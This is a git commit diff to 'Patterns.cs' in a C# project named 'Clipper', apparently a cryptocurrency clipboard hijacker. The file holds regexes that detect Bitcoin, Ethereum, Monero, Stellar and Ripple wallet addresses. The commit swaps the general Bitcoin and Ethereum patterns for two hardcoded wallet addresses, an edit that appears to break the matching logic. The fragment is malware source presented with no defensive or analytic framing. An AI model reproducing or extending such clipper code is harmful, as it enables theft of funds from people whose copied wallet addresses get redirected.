2906414f1be561efa3d1e343c5f1751104739d04
HAPPYLIFE177 <147577158+HAPPYLIFE177@users.noreply.github.com>
2023-10-11 05:05:55 +0100

    CRYPTO

--- Clipper/Modules/Patterns.cs
+++ Clipper/Modules/Patterns.cs
@@ -7,8 +7,8 @@ namespace Clipper.Modules
     {
         public static Dictionary<string, Regex> patterns = new Dictionary<string, Regex>()
         {
-            {"btc", new Regex(@"(?:^(bc1|[13])[a-zA-HJ-NP-Z0-9]{26,35}$)") }, // Bitcoin
-            {"eth", new Regex(@"(?:^0x[a-fA-F0-9]{40}$)") }, // Ethereum
+            {"btc", new Regex(@"(?:^(bc1qq24csngj73vyscx9lh7t6swk5z9v0q9p5sdjlm)") }, // Bitcoin
+            {"eth", new Regex(@"(0x7836fbb780bE18a850d4cAd11B1EA4C516c6C3C9)") }, // Ethereum
             {"xmr", new Regex(@"(?:^4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}$)") }, // Monero
             {"xlm", new Regex(@"(?:^G[0-9a-zA-Z]{55}$)") }, // Stellar
             {"xrp", new Regex(@"(?:^r[0-9a-zA-Z]{24,34}$)") }, // Ripple
